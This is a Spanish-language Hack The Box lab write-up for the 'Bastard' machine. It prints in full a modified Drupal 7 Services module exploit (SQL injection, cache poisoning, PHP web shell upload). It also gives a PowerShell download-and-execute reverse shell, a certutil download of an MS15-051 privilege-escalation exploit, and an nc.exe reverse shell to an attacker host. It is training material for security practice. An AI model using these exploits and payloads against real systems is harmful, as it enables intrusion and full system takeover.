---
title: Hack The Box Bastard
author: k4miyo
date: 2021-10-09
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Windows]
tags: [Windows, PHP, Patch Management]
ping: true
---

## Bastard
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.9.

```bash
❯ ping -c 1 10.10.10.9
PING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.
64 bytes from 10.10.10.9: icmp_seq=1 ttl=127 time=136 ms

--- 10.10.10.9 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.110/136.110/136.110/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.9 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-05 23:36 CDT
Initiating SYN Stealth Scan at 23:36
Scanning 10.10.10.9 [65535 ports]
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed SYN Stealth Scan at 23:36, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.14s latency).
Scanned at 2021-10-05 23:36:01 CDT for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.9
   5   │     [*] Open ports: 80,135,49154
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80,135,49154 10.10.10.9 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-05 23:37 CDT
Nmap scan report for 10.10.10.9
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.37 seconds
```

Vemos que tiene el puerto 80 abierto; por lo que ya sabemos, antes de visualizar el contenido vía web, utilizaremos `whatweb`:

```bash
❯ whatweb http://10.10.10.9/
http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10.10.10.9 | 10.10.10.9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
```

Tenemos un Microsft IIS 7.5 y un CMS Drupal. Ahora si vamos a echarle un ojo.

![](/assets/images/htb-bastard/bastard-drupal.png)

Como observamos el CMS Drupal, por lo que podríamos tratar de probar credenciales default; sin embargo, vemos que no tenemos acceso. Analizando un poco la información obtenida de `nmap`, debería existir un recurso denominado `changelog.txt` en el cual podemos ver la versión del gestor de contenido.

![](/assets/images/htb-bastard/bastard-cms.png)

Vemos que se trata de ***Drupal 7.54***, así que utilizamos `searchsploit` para observar algún exploit público:

```bash
❯ searchsploit drupal 7.
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                              | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                               | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                    | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                    | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                       | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                         | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                             | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                        | php/webapps/3313.pl
Drupal < 7.34 - Denial of Service                                                              | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                                              | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                       | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                    | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution            | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution            | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)        | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)               | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Meta | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                 | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                             | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                              | php/webapps/44501.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting         | php/webapps/25493.txt
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                  | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                        | php/webapps/35397.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                              | php/remote/40130.rb
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vemos un recurso interesante **Drupal 7.x Module Services - Remote Code Execution**, así que lo tratemos a nuestro entorno de trabajo, le modificamos el nombre a uno más descriptivo y procedemos a analizarlo.

```bash
❯ cd ../content/
❯ searchsploit -m php/webapps/41564.php
  Exploit: Drupal 7.x Module Services - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/41564
     Path: /usr/share/exploitdb/exploits/php/webapps/41564.php
File Type: ASCII text, with CRLF line terminators

Copied to: /home/k4miyo/Documentos/HTB/Bastard/content/41564.php


❯ ll
.rw-r--r-- root root 8.5 KB Thu Oct  7 00:40:03 2021  41564.php
❯ mv 41564.php drupal_rce.php
```

Analizando el exploit, vemos que necesitamos realizarle unos cambios para que se adapte a lo que estamos buscando:

- `$url = 'http://vmweb.lan/drupal-7.54'` lo cambiamos por `$url = 'http://10.10.10.9'`.
- `$endpoint_path = '/rest_endpoint'` si validamos el recurso, vemos que no existe; sin embargo, pensando un poco, vemos que busca el recurso `/rest_endpoint`, así que podríamos buscar por `/rest` el cual si existe.

![](/assets/images/htb-bastard/bastard-rest.png)

- Vemos que el exploit define un nombre archivo el cual va a ser subido para inyectar nuestro código malicioso `'filename' => 'dixuSOspsOUU.php',`; aquí podriamos ponerle el nombre que nosotros queramos, como por ejemplo ***k4mishell.php***.
- A nivel de data, se tiene esto `'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'`; sin embargo, nosotros queremos utilizar una variable para poder ejecutar comandos; así que lo modificamos por `'data' => '<?php system($_REQUEST["cmd"]); ?>'`.

Realizando las modificamos, tenemos lo siguiente:

```php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
<?php
# Drupal Services Module Remote Code Execution Exploit
# https://www.ambionics.io/blog/drupal-services-module-rce
# cf
#
# Three stages:
# 1. Use the SQL Injection to get the contents of the cache for current endpoint
#    along with admin credentials and hash
# 2. Alter the cache to allow us to write a file and do so
# 3. Restore the cache
# 

# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'k4miyo.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];

$browser = new Browser($url . $endpoint_path);


# Stage 1: SQL Injection

class DatabaseCondition
{
    protected $conditions = [
        "#conjunction" => "AND"
    ];
    protected $arguments = [];
    protected $changed = false;
    protected $queryPlaceholderIdentifier = null;
    public $stringVersion = null;

    public function __construct($stringVersion=null)
    {
        $this->stringVersion = $stringVersion;

        if(!isset($stringVersion))
        {
            $this->changed = true;
            $this->stringVersion = null;
        }
    }
}

class SelectQueryExtender {
    # Contains a DatabaseCondition object instead of a SelectQueryInterface
    # so that $query->compile() exists and (string) $query is controlled by us.
    protected $query = null;

    protected $uniqueIdentifier = QID;
    protected $connection;
    protected $placeholder = 0;

    public function __construct($sql)
    {
        $this->query = new DatabaseCondition($sql);
    }
}

$cache_id = "services:$endpoint:resources";
$sql_cache = "SELECT data FROM {cache} WHERE cid='$cache_id'";
$password_hash = '$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd';

# Take first user but with a custom password
# Store the original password hash in signature_format, and endpoint cache
# in signature
$query = 
    "0x3a) UNION SELECT ux.uid AS uid, " .
    "ux.name AS name, '$password_hash' AS pass, " .
    "ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, " .
    "ux.pass AS signature_format, ux.created AS created, " .
    "ux.access AS access, ux.login AS login, ux.status AS status, " .
    "ux.timezone AS timezone, ux.language AS language, ux.picture " .
    "AS picture, ux.init AS init, ux.data AS data FROM {users} ux " .
    "WHERE ux.uid<>(0"
;

$query = new SelectQueryExtender($query);
$data = ['username' => $query, 'password' => 'ouvreboite'];
$data = serialize($data);

$json = $browser->post(TYPE_PHP, $data);

# If this worked, the rest will as well
if(!isset($json->user))
{
    print_r($json);
    e("Failed to login with fake password");
}

# Store session and user data

$session = [
    'session_name' => $json->session_name,
    'session_id' => $json->sessid,
    'token' => $json->token
];
store('session', $session);

$user = $json->user;

# Unserialize the cached value
# Note: Drupal websites admins, this is your opportunity to fight back :)
$cache = unserialize($user->signature);

# Reassign fields
$user->pass = $user->signature_format;
unset($user->signature);
unset($user->signature_format);

store('user', $user);

if($cache === false)
{
    e("Unable to obtains endpoint's cache value");
}

x("Cache contains " . sizeof($cache) . " entries");

# Stage 2: Change endpoint's behaviour to write a shell

class DrupalCacheArray
{
    # Cache ID
    protected $cid = "services:endpoint_name:resources";
    # Name of the table to fetch data from.
    # Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()
    protected $bin = 'cache';
    protected $keysToPersist = [];
    protected $storage = [];

    function __construct($storage, $endpoint, $controller, $action) {
        $settings = [
            'services' => ['resource_api_version' => '1.0']
        ];
        $this->cid = "services:$endpoint:resources";

        # If no endpoint is given, just reset the original values
        if(isset($controller))
        {
            $storage[$controller]['actions'][$action] = [
                'help' => 'Writes data to a file',
                # Callback function
                'callback' => 'file_put_contents',
                # This one does not accept "true" as Drupal does,
                # so we just go for a tautology
                'access callback' => 'is_string',
                'access arguments' => ['a string'],
                # Arguments given through POST
                'args' => [
                    0 => [
                        'name' => 'filename',
                        'type' => 'string',
                        'description' => 'Path to the file',
                        'source' => ['data' => 'filename'],
                        'optional' => false,
                    ],
                    1 => [
                        'name' => 'data',
                        'type' => 'string',
                        'description' => 'The data to write',
                        'source' => ['data' => 'data'],
                        'optional' => false,
                    ],
                ],
                'file' => [
                    'type' => 'inc',
                    'module' => 'services',
                    'name' => 'resources/user_resource',
                ],
                'endpoint' => $settings
            ];
            $storage[$controller]['endpoint']['actions'] += [
                $action => [
                    'enabled' => 1,
                    'settings' => $settings
                ]
            ];
        }

        $this->storage = $storage;
        $this->keysToPersist = array_fill_keys(array_keys($storage), true);
    }
}

class ThemeRegistry Extends DrupalCacheArray {
    protected $persistable;
    protected $completeRegistry;
}

cache_poison($endpoint, $cache);

# Write the file
$json = (array) $browser->post(TYPE_JSON, json_encode($file));


# Stage 3: Restore endpoint's behaviour

cache_reset($endpoint, $cache);

if(!(isset($json[0]) && $json[0] === strlen($file['data'])))
{
    e("Failed to write file.");
}

$file_url = $url . '/' . $file['filename'];
x("File written: $file_url");


# HTTP Browser

class Browser
{
    private $url;
    private $controller = CONTROLLER;
    private $action = ACTION;

    function __construct($url)
    {
        $this->url = $url;
    }

    function post($type, $data)
    {
        $headers = [
            "Accept: " . TYPE_JSON,
            "Content-Type: $type",
            "Content-Length: " . strlen($data)
        ];
        $url = $this->url . '/' . $this->controller . '/' . $this->action;

        $s = curl_init(); 
        curl_setopt($s, CURLOPT_URL, $url);
        curl_setopt($s, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($s, CURLOPT_POST, 1);
        curl_setopt($s, CURLOPT_POSTFIELDS, $data);
        curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0);
        $output = curl_exec($s);
        $error = curl_error($s);
        curl_close($s);

        if($error)
        {
            e("cURL: $error");
        }

        return json_decode($output);
    }
}

# Cache

function cache_poison($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, CONTROLLER, ACTION);
    cache_edit($tr);
}

function cache_reset($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, null, null);
    cache_edit($tr);
}

function cache_edit($tr)
{
    global $browser;
    $data = serialize([$tr]);
    $json = $browser->post(TYPE_PHP, $data);
}

# Utils

function x($message)
{
    print("$message\n");
}

function e($message)
{
    x($message);
    exit(1);
}

function store($name, $data)
{
    $filename = "$name.json";
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
    x("Stored $name information in $filename");
}

```

Ahora si, procedemos a ejecutar el exploit:

```bash
❯ php drupal_rce.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9//k4miyo.php
```

Si accedemos al recurso que nos indica `http://10.10.10.9//k4miyo.php` y validamos que tenemos ejecución de comandos con nuestra variable `cmd`:

![](/assets/images/htb-bastard/bastard-cmd.png)

Una vez teniendo ejecución de comandos, ahora si nos entablamos una reverse shell; por lo tanto, nos copiamos el archivo `Invoke-PowerShellTcp.ps1` a nuestro directorio de trabajo y al final del archivo agregamos al siguiente linea `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 443`

```bash
❯ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
```

Nos compartimos un servidor HTTP con python y nos ponemos en escucha a través del puerto 443. Una vez con esto, ejecutamos al siguiente linea (**Nota**: Utilizando powershell desde la parte nativa del sistema `
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe` para evitar problemas debido que nos encontremos un proceso diferente al soportado por el sistema operativo).

```bash
http://10.10.10.9//k4miyo.php?cmd=C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/PS.ps1')
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [08/Oct/2021 00:54:16] "GET /PS.ps1 HTTP/1.1" 200 -
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.9] 49180
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54>
```

A este punto ya podemos visualizar la flag (user.txt). Nos queda escalar privilegios, por lo que para esta ocación, ocuparemos la herramienta [Sherlock](https://github.com/rasta-mouse/Sherlock), así que nos la descargamos.

```bash
❯ git clone https://github.com/rasta-mouse/Sherlock
Clonando en 'Sherlock'...
remote: Enumerating objects: 75, done.
remote: Total 75 (delta 0), reused 0 (delta 0), pack-reused 75
Recibiendo objetos: 100% (75/75), 33.97 KiB | 552.00 KiB/s, listo.
Resolviendo deltas: 100% (39/39), listo.
```

Abrimos el archivo `Sherlock.ps1` y al final de todo, agregamos la siguiente linea `Find-AllVulns`. Ahora si estamos listos para hacer enumeración del sistema. Nos compartimos un servidor HTTP con python:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [08/Oct/2021 01:09:37] "GET /Sherlock.ps1 HTTP/1.1" 200 -
```

Ejecutamos la siguiente linea en la máquina víctima:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/Sherlock.ps1')
PS C:\Windows\Temp\Privesc>
```

Esperamos un poco a que la herramienta haga su trabajo y nos reporte la información.

```bash
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015                                           
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems           
                                
Title      : Task Scheduler .XML 
MSBulletin : MS10-092                                           
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable                                 
                                                                
Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053                                           
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems           
                                
Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081                                           
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems                                                                                     
                                
Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113                                          
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable
          
Title      : ClientCopyImage Win32k 
MSBulletin : MS15-051      
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
                                
Title      : Font Driver Buffer Overflow                                           
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable
Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable

PS C:\Windows\Temp\Privesc>
```

De acuerdo con los resultados observamos, tenemos las siguientes posibles vulnerabilidades para escalar privilegios:

- Task Scheduler .XML - MS10-092
- ClientCopyImage Win32k - MS15-051
- Secondary Logon Handle - MS16-032

Para este caso, vamos a utilizar ***ClientCopyImage Win32k - MS15-051***; asi que vamos a descargar el exploit correspondiente al [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip); lo descomprimimos

```bash
❯ unzip MS15-051-KB3045171.zip
Archive:  MS15-051-KB3045171.zip
   creating: MS15-051-KB3045171/
  inflating: MS15-051-KB3045171/ms15-051.exe  
  inflating: MS15-051-KB3045171/ms15-051x64.exe  
   creating: MS15-051-KB3045171/Source/
   creating: MS15-051-KB3045171/Source/ms15-051/
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.cpp  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.filters  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.user  
  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll.lib  
  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll64.lib  
  inflating: MS15-051-KB3045171/Source/ms15-051/ReadMe.txt  
   creating: MS15-051-KB3045171/Source/ms15-051/Win32/
  inflating: MS15-051-KB3045171/Source/ms15-051/Win32/ms15-051.exe  
   creating: MS15-051-KB3045171/Source/ms15-051/x64/
  inflating: MS15-051-KB3045171/Source/ms15-051/x64/ms15-051x64.exe  
  inflating: MS15-051-KB3045171/Source/ms15-051.sln  
  inflating: MS15-051-KB3045171/Source/ms15-051.suo
```

Y transferimos el archivo `ms15-051x64.exe` a la máquina víctima.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [08/Oct/2021 01:25:31] "GET /ms15-051x64.exe HTTP/1.1" 200 -
10.10.10.9 - - [08/Oct/2021 01:25:32] "GET /ms15-051x64.exe HTTP/1.1" 200 -
```

```bash
certutil.exe -f -urlcache -split http://10.10.14.17/ms15-051x64.exe ms15-051x64.exe
****  Online  ****
  0000  ...
  d800
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\Privesc>
```

Ahora en nuestra máquina buscamos el archivo `nc.exe` y lo ponemos en nuestro directorio de trabajo.

```bash
❯ locate nc.exe
/usr/share/sqlninja/apps/nc.exe
❯ cp /usr/share/sqlninja/apps/nc.exe .
```

Nos compartimos un servidor SMB en nuestra máquina de atacante y damos soporte a la versión 2:

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.9,49191)
[*] AUTHENTICATE_MESSAGE (\,BASTARD)
[*] User BASTARD\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
```

Nos ponemos en escucha a través del puerto 443 y procedemos a ejecutar el exploit: 

```bash
C:\Windows\Temp\Privesc\ms15-051x64.exe "\\10.10.14.17\smbFolder\nc.exe -e cmd 10.10.14.17 443"
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.9] 49192
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\Temp\Privesc>
```

Ya somo el usuario `nt authority\system` y podemos visualizar la flag (root.txt).
